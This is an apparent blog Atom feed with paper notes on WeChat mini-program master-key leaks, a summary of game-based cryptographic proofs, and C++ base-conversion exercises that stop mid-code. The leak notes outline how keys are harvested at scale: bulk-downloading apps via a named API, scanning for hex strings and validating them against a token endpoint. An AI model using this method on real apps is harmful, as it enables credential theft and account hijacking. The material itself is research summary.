<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sh1k4ku&#39;s blog</title>
  
  <subtitle>记录我的学习之路</subtitle>
  <link href="http://sh1k4ku.github.io/atom.xml" rel="self"/>
  
  <link href="http://sh1k4ku.github.io/"/>
  <updated>2023-08-15T09:50:48.400Z</updated>
  <id>http://sh1k4ku.github.io/</id>
  
  <author>
    <name>sh1k4ku</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>小程序论文阅读笔记</title>
    <link href="http://sh1k4ku.github.io/2023/08/15/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    <id>http://sh1k4ku.github.io/2023/08/15/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</id>
    <published>2023-08-15T02:48:02.000Z</published>
    <updated>2023-08-15T09:50:48.400Z</updated>
    
    <content type="html"><![CDATA[<p>论文记录</p><span id="more"></span><h1 id="dont-leak-your-keys-understanding-measuring-and-exploiting-the-appsecret-leaks-in-mini-programs">Don’tLeak Your Keys: Understanding, Measuring, and Exploiting the AppSecretLeaks in Mini-Programs</h1><p>小程序，挂在app上，其因规模小、功能丰富的原因，在市场上大受欢迎，这也让app成为了superapp，就像为软件提供平台的操作系统一样。同时，作为一种应用，小程序需要通过特定的api来访问后端或云上的数据或服务，也因此，小程序后端的masterkey(MS)至关重要，它对于小程序来说几乎是root权限的存在，要将MS保存在后端而不能发往前端，否则会造成严重的后果，本文便是基于这个思路所写。</p><p>接下来，文章以微信为例，介绍了微信上的小程序的预备知识，下图1是小程序的常用api和云服务，例如获取手机号（在中国，一个app上的手机号即绑定了一个公民的身份）、用户信息，亦或是使用OCR、安全服务等：</p><p><img src="/images/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230815110554834.png" alt="image-20230815110554834"></p><p>相较于传统的app和web服务，小程序天然带有一系列密钥管理和访问协议，确保密钥不会被非法获取，下图是小程序业务流程中主要涉及的四个密钥：</p><p><img src="/images/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230815111523583.png" alt="image-20230815111523583"></p><p>在一次敏感数据访问，通常的业务逻辑是这样的：首先小程序前端（MF）向微信客户端（WC）请求LoginToken(LT)，WC向微信服务端(WS)请求得到后发给MF，MF再利用LT向小程序后端(MB)发起登陆请求；随后，MB把LT,MK,appID发给WC得到加密密钥(EK)；同时MF再次通过WC从WS得到用户的数据，只不过是用EK加密后的密文C。最后，MF把C传给MB，MB用EK对其进行解密，完成一次敏感数据访问。该协议可由下图概括：</p><p><img src="/images/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230815112258234.png" alt="image-20230815112258234"></p><p>与之相比，云服务访问协议就简单很多，只在MB和WS之间发生：只需要MB向WS请求得到AT，即可用AT调用服务：</p><p><img src="/images/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20230815112511761.png" alt="image-20230815112511761"></p><p>接下来，作者介绍了小程序密钥的威胁模型，即上述四个密钥的作用和泄露带来的危害；这篇文章聚焦于MK的泄露，因为MK泄露总是能造成EK和AT的泄露，攻击者便可以访问隐私数据以及免费享受云服务功能。</p><p>终于到方法论的部分了，作者基于以下五个问题展开：</p><ul><li>问题 1：MK 泄露小程序的类别是什么？</li><li>问题 2：它们的评级如何？</li><li>问题 3：它们获取了哪些资源？</li><li>问题 4：它们的开发者是谁？</li><li>问题 5：它们的最新更新时间是什么时候？</li><li>问题 6：是否有备受瞩目的小程序存在MK泄露？</li></ul><p>首先便是数据收集环节，作者通过“Mp.wx.qq.com/wxa-cgi/innersearch”API来批量下载小程序，得到了3,450,586个小程序（太可怕了）。在获取前端代码后，去寻找里面的32个16进制字符串，通过“Api.weixin.qq.com/cgi-bin/token”API确定是否为MK，得到的结果是40,880个小程序存在MK泄露的问题。得到数据集，便可进行分析，回答上述五个问题：</p><ul><li>泄露MK的小程序种类多种多样，生活方式和购物类占比最高，工具、政府和游戏类数量较多。</li><li>作者基于用户的评分对小程序评级，结果表明，低评级的小程序更容易存在MK泄露。</li><li>有24,701个小程序可以通过MK泄露被账户劫持、推广滥用、服务窃取（这些攻击会在下面介绍）；同时6,907个小程序没有这样的问题，但不保证以后也不会有。</li><li>大多公司只开发了一个存在这种问题的小程序，但也有开发了30个的。</li><li>自微信引入小程序的第一年，就存在MK泄露的问题；随着时间推移，漏洞小程序数量在减少。</li><li>一些高知名度的公司在多个小程序中犯了同样的错误（如雀巢）；微信提供商腾讯是小程序中出现 MK泄露的排名第一的公司；一些高知名度公司的小程序只泄露了MK，而没有访问敏感信息。</li></ul><p>然后，作者提出了基于MK泄露的两种攻击，一种是针对敏感数据的，如账户劫持、推广滥用，另一种是针对云服务的，如服务窃取。作者不仅提出攻击，还提出了修复意见和推广这个研究到其他app上，以及表明自己在研究过程中遵守了道德准则，例如每分钟只发送六个爬取小程序的请求、限制确认MK的线程数、保证只使用自己的账户。</p><p>最后，介绍了一下近几年有关小程序和密钥泄露的相关研究，并提出总结。</p><h1 id="a-measurement-study-of-wechat-mini-apps">A Measurement Study ofWechat Mini-Apps</h1><p>这一篇是2021年zhangyue老师的论文，介绍了他们开发的分析微信小程序的工具MiniCrawler，篇幅较短只有2页</p><p>引入了小程序的背景后，开始介绍他们的工具，总共分为三个部分：</p><ol type="1"><li>元数据爬虫：接受一系列关键词，通过微信的api爬取小程序的信息</li><li>关键词生成器：使用NLP技术分析小程序的名称和描述，生成高质量的关键词</li><li>包下载器：根据appid下载小程序的包</li></ol><p>拿到包后，便可以统计小程序的信息，做出归纳推理，文中统计了小程序的大小、常用api、类型、rating(评分？)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;论文记录&lt;/p&gt;</summary>
    
    
    
    <category term="论文阅读笔记" scheme="http://sh1k4ku.github.io/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="paper" scheme="http://sh1k4ku.github.io/tags/paper/"/>
    
    <category term="miniapp" scheme="http://sh1k4ku.github.io/tags/miniapp/"/>
    
  </entry>
  
  <entry>
    <title>Sequences of Games</title>
    <link href="http://sh1k4ku.github.io/2023/07/09/Sequences-of-Games/"/>
    <id>http://sh1k4ku.github.io/2023/07/09/Sequences-of-Games/</id>
    <published>2023-07-09T06:54:18.000Z</published>
    <updated>2023-07-09T14:04:38.883Z</updated>
    
    <content type="html"><![CDATA[<p>关于《Sequences of Games: A Tool for Taming Complexity in SecurityProofs∗》的总结和疑问</p><span id="more"></span><p>咨询可证明安全的学习建议时，沛公和Tover师傅推荐读这篇论文（还有《Introductionto Modern Cryptography 》，有空再看T-T）</p><p>PS：最近一两个月给我的感觉，臭打CTF的，密码学压根没入门23333，还有好多好多要学的，计算复杂性、可证明安全、UC等等，总之任重道远，进入正题。</p><h1 id="介绍">介绍</h1><p>总的来说，关于安全规约有两种方式，基于游戏的和基于模拟的安全，这篇文章主要是介绍如何使用基于游戏的安全证明来保证一个方案是安全的，其基本方法是假设一堆游戏，Game0, Game 1, ... , Game n, 其中Game0是关于对手和方案的原始攻击游戏，并定义<span class="math display">\[S_0,S_1, ... ,S_n\]</span>为Game中的事件。随后，通过一步步推导，得到<span class="math display">\[\text{Pr}[S_0]\]</span>和之后的事件差距很小（negligiblyclose）或相等，最后说明<span class="math display">\[\text{Pr}[S_n]\]</span>与一个目标概率相等或可忽略不计，则可证明是安全的。</p><p>为了让证明尽可能简洁，连续游戏之间的变换有三种类型：</p><ol type="1"><li><strong>Transitions based on indistinguishability</strong></li><li><strong>Transitions based on failure events</strong></li><li><strong>Bridging steps</strong></li></ol><h2 id="基于不可区分的过渡">基于不可区分的过渡</h2><p>假定有一个很小的改变在连续的游戏之间，如果被敌手所检测到，就说明存在一个高效的算法能区分两个不可区分的分布。例如：</p><p>假设<span class="math display">\[P_1\]</span>和<span class="math display">\[P_2\]</span>是两个不可区分的分布，为了证明<span class="math display">\[|\text{Pr}[S_i] -\text{Pr}[S_{i+1}]|\]</span>是忽略不计的，假定存在一个区分算法（distinguishingalgorithm）<span class="math display">\[ D\]</span> 插入在Game i和Gamei+1之间，当输入为取自分布<span class="math display">\[ P_1\]</span>的元素时，D输出1的概率为<span class="math display">\[\text{Pr}[S_i]\]</span> ；当输入为取自分布<span class="math display">\[P_2\]</span> 的元素时，D输出1的概率为<span class="math display">\[\text{Pr}[S_{i+1}]\]</span> ，于是不可区分性就证明了<span class="math display">\[|\text{Pr}[S_i] -\text{Pr}[S_{i+1}]|\]</span>是忽略不计的。</p><h2 id="基于失败事件的过渡">基于失败事件的过渡</h2><p>在这种情况下，Game i 和Game i+1完全相同除非事件<span class="math display">\[F\]</span>发生。为了尽可能简洁，最好要让两个Game定义在两个相同的概率空间，唯一的不同是计算某些随机变量。所以有：<span class="math display">\[S_i\land F \Longleftrightarrow S_{i+1} \land F\]</span> 也就是说<span class="math display">\[S_i\land F 和\]</span><span class="math display">\[S_{i+1} \landF\]</span>相同，证明也不困难，利用<strong>DifferenceLemma</strong>(其实非常trivial)</p><p><img src="/images/Sequences-of-Games/image-20230709214524408.png" alt="image-20230709214524408"></p><p>所以只需要证明<span class="math display">\[\text{Pr}[F]\]</span>是可忽略不计的就可以得到结论，通常这又是基于一个安全假设（例如当F发生时，敌手发现了一个哈希碰撞或者伪造了一个MAC）。</p><p>---------------------------------------下面这两段没太懂------------------------------</p><p><img src="/images/Sequences-of-Games/image-20230709215538103.png" alt="image-20230709215538103"></p><p>比如第一段的最后一句，通常其中某个game会更适合分析得出清晰的证明，难道不需要分析F和二者之间吗？</p><p>以及第二段的第二句开始到最后都不太懂。</p><h2 id="桥接步骤">桥接步骤</h2><p>这个我觉得是最玄乎的方式，以相同的方式重述某些量的计算，改变是完全概念上的，就可以得到<span class="math display">\[\text{Pr}[S_i] = \text{Pr}[S_{i+1}]\]</span></p><p>后面也只介绍了为什么要引入这个方式：如果没有它某些证明就会很麻烦0.0.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于《Sequences of Games: A Tool for Taming Complexity in Security
Proofs∗》的总结和疑问&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://sh1k4ku.github.io/categories/Crypto/"/>
    
    
    <category term="可证明安全" scheme="http://sh1k4ku.github.io/tags/%E5%8F%AF%E8%AF%81%E6%98%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>算法刷题记录</title>
    <link href="http://sh1k4ku.github.io/2023/06/08/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://sh1k4ku.github.io/2023/06/08/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2023-06-08T09:12:48.000Z</published>
    <updated>2023-07-05T02:21:19.548Z</updated>
    
    <content type="html"><![CDATA[<p>我是什么fw😢</p><span id="more"></span><p>[toc]</p><h1 id="入门">入门</h1><h2 id="进制">进制</h2><h3 id="十进制和二进制">十进制和二进制</h3><p>介绍：对于一个十进制数A，将A转换为二进制数，然后按位逆序排列，再转换为十进制数B，我们称B为A的二进制逆序数。例如对于十进制数173，它的二进制形式为10101101，逆序排列得到10110101，其十进制数为181，181即为173的二进制逆序数。</p><p>重点就是大数的十进制和二进制互转。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">d2b</span><span class="params">(<span class="type">char</span> s[<span class="number">1000</span>])</span></span>&#123;</span><br><span class="line">    string result;</span><br><span class="line">    <span class="type">int</span> num[<span class="number">1000</span>];</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)&#123;</span><br><span class="line">        num[i] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; len)&#123;</span><br><span class="line">        <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">        result += num[len<span class="number">-1</span>] % <span class="number">2</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++)&#123;</span><br><span class="line">            <span class="type">int</span> tmp = num[j];</span><br><span class="line">            num[j] = (num[j] + c) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(tmp % <span class="number">2</span> == <span class="number">1</span>) c = <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">else</span> c = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num[i] == <span class="number">0</span>) i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(result.<span class="built_in">begin</span>(), result.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">b2d</span><span class="params">(string sb)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> len = sb.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> upb = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> res_d[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">string result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; upb; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">0</span>)&#123;</span><br><span class="line">res_d[j] = res_d[j] * <span class="number">2</span> + (sb[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">res_d[j] = res_d[j] * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; upb; k++)&#123;</span><br><span class="line"><span class="keyword">if</span>(res_d[k] &gt; <span class="number">9</span>)&#123;</span><br><span class="line">res_d[k+<span class="number">1</span>]++;</span><br><span class="line">res_d[k] %= <span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span>(k == upb - <span class="number">1</span>)&#123;</span><br><span class="line">upb ++ ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = upb - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">result += res_d[i] + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">        string sb = <span class="built_in">d2b</span>(s);</span><br><span class="line">        <span class="built_in">reverse</span>(sb.<span class="built_in">begin</span>(), sb.<span class="built_in">end</span>());</span><br><span class="line">        string res = <span class="built_in">b2d</span>(sb);</span><br><span class="line">        cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="进制转换m2n">进制转换M2N</h3><p>就是在M进制转十进制的时候把进位的10改成n（十进制转N进制其实没必要单独写了）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">m2n</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n, string num)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> len = num.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> upb = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> res_d[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">string result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; upb; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((num[i] - <span class="string">&#x27;0&#x27;</span>) &lt; <span class="number">10</span>)res_d[j] = res_d[j] * m + (num[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="keyword">else</span> res_d[j] = res_d[j] * m + (num[i] - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">res_d[j] = res_d[j] * m;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; upb; k++)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(res_d[k] &gt; n<span class="number">-1</span>)&#123;</span><br><span class="line">res_d[k+<span class="number">1</span>] += res_d[k] / n;</span><br><span class="line">res_d[k] %= n;</span><br><span class="line"><span class="keyword">if</span>(k == upb - <span class="number">1</span>)&#123;</span><br><span class="line">upb ++ ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = upb - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(n &gt; <span class="number">9</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(res_d[i] &gt; <span class="number">9</span>)&#123;</span><br><span class="line">result += (res_d[i] - <span class="number">10</span> + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">result += res_d[i] + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">result += res_d[i] + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> m, n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; m &gt;&gt; n)&#123;</span><br><span class="line">string m_num;</span><br><span class="line">cin &gt;&gt; m_num;</span><br><span class="line">string n_num = <span class="built_in">m2n</span>(m, n, m_num);</span><br><span class="line">cout &lt;&lt; n_num &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="负二进制">负二进制</h3><p>注意C里面除以-2的余数有好几种情况，-1-0-1都有可能；</p><p>还有边界输入0考虑一下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ip;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; ip)&#123;</span><br><span class="line">string op;</span><br><span class="line"><span class="keyword">if</span>(ip == <span class="number">0</span>)&#123;</span><br><span class="line">cout &lt;&lt; <span class="number">0</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(ip!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">int</span> r = ip % <span class="number">-2</span>, k = ip / <span class="number">-2</span>;</span><br><span class="line"><span class="keyword">if</span>(r == <span class="number">0</span>)&#123;</span><br><span class="line">ip = k;</span><br><span class="line">op += r + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r == <span class="number">-1</span>)&#123;</span><br><span class="line">ip = k+<span class="number">1</span>;</span><br><span class="line">op += r+<span class="number">2</span>+<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r == <span class="number">1</span>)&#123;</span><br><span class="line">ip = k;</span><br><span class="line">op += r + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">reverse</span>(op.<span class="built_in">begin</span>(), op.<span class="built_in">end</span>());</span><br><span class="line">cout &lt;&lt; op &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="排序">排序</h2><h3 id="旋转矩阵">旋转矩阵</h3><p>函数调用二维数组和返回指针有点折磨，最后还是定义了全局变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> data[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> s[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">one</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">data[i][j] = s[n-j<span class="number">-1</span>][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line"><span 